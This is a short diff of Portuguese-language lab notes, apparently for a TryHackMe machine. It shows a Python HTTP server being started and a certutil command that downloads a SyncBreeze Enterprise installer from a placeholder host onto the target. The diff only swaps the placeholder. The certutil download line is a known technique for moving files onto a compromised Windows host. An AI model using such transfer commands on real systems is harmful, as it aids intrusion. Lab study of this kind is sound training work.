@@ -7,4 +7,4 @@
 - ```python3 -m http.server (port)```
 
 **Baixar o arquivo na máquina do THM**
-- ```certutil -urlcache -split -f http://vpnip:port/syncbreezeent_setup_v10.0.28.exe```
+- ```certutil -urlcache -split -f http://ip:port/syncbreezeent_setup_v10.0.28.exe```
